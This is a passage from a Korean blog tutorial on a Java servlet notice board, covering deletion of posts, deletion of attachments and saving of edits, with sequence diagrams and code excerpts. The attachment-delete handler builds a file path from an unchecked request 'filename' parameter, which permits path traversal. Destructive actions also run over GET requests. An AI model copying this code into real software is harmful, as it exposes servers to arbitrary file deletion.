<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">re</span><span class="p">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">});</span>
<span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span>
</code></pre></div></div>

<ul>
  <li>JSON.stringify(xx) : 자바 스크립트 객체를 Json data로 변환한다.</li>
  <li>JSON.parse(xx) : Json data를 자바 스크립트 객체로 변환한다.</li>
</ul>

<h4 id="servlet-1">Servlet</h4>
<h5 id="설명-3">설명</h5>
<ul>
  <li>자기가 쓴 게시글에서 삭제하기 버튼을 누르면 DB에 저장된 게시글이 삭제되고, 웹 서버에 저장된 첨부파일도 삭제된다.</li>
  <li>사용자가 전송한 수정된 게시글을 DB서버에 저장한다.</li>
  <li>사용자가 파일 삭제 요청을 하면 웹 서버에 저장된 첨부파일을 삭제한다.</li>
</ul>

<h5 id="과정-3">과정</h5>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyImOyglSDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyImOyglSDtjpjsnbTsp4Ag7J2R64u1XG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyImOyglSDqsozsi5zquIAg7KCA7J6lIOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiDsmJsg6rKM7Iuc6riAIOyCreygnFxu7ISc67KEIC0-PiBEQiDshJzrsoQgOiDsg4jroZzsmrQg6rKM7Iuc6riAIOyggOyepSDsmpTssq1cbkRCIOyEnOuyhCAtPj4g7ISc67KEIDog7KCA7J6lIOyZhOujjCDsnZHri7VcbuyEnOuyhCAtPj4g7ISc67KEIDog7JibIOqyjOyLnOq4gCDssqjrtoDtjIzsnbwg7Y-0642U66qFIOyDiOuhreqyjCDrs4Dqsr1cbuyEnOuyhCAtPj4g7ISc67KEIDog7IOI66Gc7Jq0IO2MjOydvCDsoIDsnqVcbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc6riAIOyImOyglSDsmYTro4wg7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>

<ol>
  <li>사용자가 게시글을 수정 및 파일을 추가 하여 서버에 수정본 저장 요청을 보낸다.</li>
  <li>서버는 옛 게시글을 삭제한다.</li>
  <li>서버는 수정된 제목과 본문을 DB 서버에 새롭게 저장한다.</li>
  <li>옛 게시글의 첨부파일이 들어있는 폴더 명을 새로운 게시글과 연관된 폴더명으로 변경해 준다. ( 파일명 : 게시글생성일_게시글번호 )</li>
  <li>새로운 첨부파일이 있으면 웹 서버의 게시글 관련 폴더에 저장해 준다.</li>
  <li>새로운 개시글과 첨부파일 저장이 완료되면 사용자에게 성공 응답을 한다.</li>
</ol>

<h5 id="첨부파일-삭제과정">첨부파일 삭제과정</h5>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyyqOu2gO2MjOydvCDsgq3soJwgZ2V0IOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiDssqjrtoDtjIzsnbwg7IKt7KCcXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IGpzb24oc3VjY2VzcyBvciBmYWlsKSDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>
<ol>
  <li>사용자는 javascript의 fetch 함수를 통해 첨부파일 삭제 get 요청을 보낸다.</li>
  <li>요청을 보낼 때 파라미터로 게시글 번호와 첨부파일 명을 보내준다.</li>
  <li>서버에서 게시글 번호와 첨부파일 명을 받아 게시글 작성자와 요청을 보낸 사용자가 일치하는지 확인한다.</li>
  <li>일치하면 존재하는 첨부파일인지 확인한다.</li>
  <li>파일이 존재하면 저장된 파일을 삭제한다.</li>
  <li>json 형태로 사용자에게 파일 삭제 성공 하였다고 응답한다. (success)</li>
</ol>

<h5 id="게시글-삭제-과정">게시글 삭제 과정</h5>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7JqU7LKtXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7JqU7LKtXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7ISx6rO1IOydkeuLtVxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5zquIAg7YyM7J28IOyXheuhnOuTnCDtj7TrjZQg7IKt7KCcXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6ICDsgq3soJzsmYTro4wg7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>

<ol>
  <li>사용자는 자기가 쓴 글 삭제요청을 보낸다.</li>
  <li>DB에 저장된 게시글을 삭제한다.</li>
  <li>파일 업로드 폴더를 삭제한다.</li>
  <li>삭제완료 응답을 사용자에게 보낸다.</li>
</ol>

<h5 id="코드-mainpagejava">코드 (MainPage.java)</h5>

<ul>
  <li>게시글 삭제</li>
  <li>업로드 한 파일을 저장하기 위한 폴더를 삭제해 준다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 글 삭제하기</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardDelete</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span><span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// *** 파일 업로드 폴더 삭제 ***</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folderName</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getGenTime</span><span class="o">()+</span><span class="s">"_"</span><span class="o">+</span><span class="n">notice</span><span class="o">.</span><span class="na">getSid</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">uploadPath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">folderName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">uploadPath</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">folder</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">files</span> <span class="o">=</span> <span class="n">folder</span><span class="o">.</span><span class="na">listFiles</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 모든 파일 삭제</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="n">file</span> <span class="o">:</span> <span class="n">files</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">file</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 마지막으로 폴더 삭제</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">folder</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// *** 파일 업로드 폴더 삭제 end ***</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span> <span class="o">=</span> <span class="s">"&lt;script&gt;alert('success');location.href='"</span><span class="o">+</span><span class="n">noticeBoard</span><span class="o">+</span><span class="s">"'&lt;/script&gt;"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<p><br /></p>
<ul>
  <li>첨부파일 삭제</li>
  <li>일치하는 파일 하나만을 삭제한다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 파일 삭제</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardFileDelete</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">re</span> <span class="o">=</span> <span class="s">"fail"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeID</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"noticeID"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"filename"</span><span class="o">);</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">sid</span> <span class="o">=</span> <span class="nc">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">noticeID</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeDAO</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NoticeBoardDAO</span><span class="o">(</span><span class="n">getServletContext</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">notice</span> <span class="o">=</span> <span class="n">noticeDAO</span><span class="o">.</span><span class="na">getNotice</span><span class="o">(</span><span class="n">sid</span><span class="o">);</span>
  
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">notice</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"존재하지 않는 게시글"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\"fail\"}"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
  
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">user</span> <span class="o">=</span> <span class="o">(</span><span class="nc">User</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getSid</span><span class="o">()</span> <span class="o">!=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getUserSID</span><span class="o">()){</span> <span class="c1">// 글 작성자와 현재 유저와 일치안함 실패</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"글 작성자와 현재유저 일치 안함"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\"fail\"}"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
  
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 파일 존재 여부 확인</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folderName</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getGenTime</span><span class="o">()+</span><span class="s">"_"</span><span class="o">+</span><span class="n">notice</span><span class="o">.</span><span class="na">getSid</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">filePath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">folderName</span><span class="o">+</span><span class="nc">File</span><span class="o">.</span><span class="na">separatorChar</span><span class="o">+</span><span class="n">filename</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">filePath</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"파일 존재 안함!"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\"fail\"}"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">isFile</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"파일이 아님!"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\"fail\"}"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
  
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 파일 삭제 하기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">file</span><span class="o">.</span><span class="na">delete</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">re</span> <span class="o">=</span> <span class="s">"success"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">re</span> <span class="o">=</span> <span class="s">"fail"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\""</span><span class="o">+</span><span class="n">re</span><span class="o">+</span><span class="s">"\"}"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<p><br /></p>
<ul>
  <li>수정 게시글 저장하기</li>
  <li>폴더 명을 변경하여 변경한 폴더에 사용자가 보낸 파일을 저장한다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 글 수정 저장하기</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"POST"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardModifySave</span><span class="o">))</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 전 저장위치</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeSID</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getSid</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">beforeFolderName</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getGenTime</span><span class="o">()+</span><span class="s">"_"</span><span class="o">+</span><span class="n">noticeSID</span><span class="o">;</span>
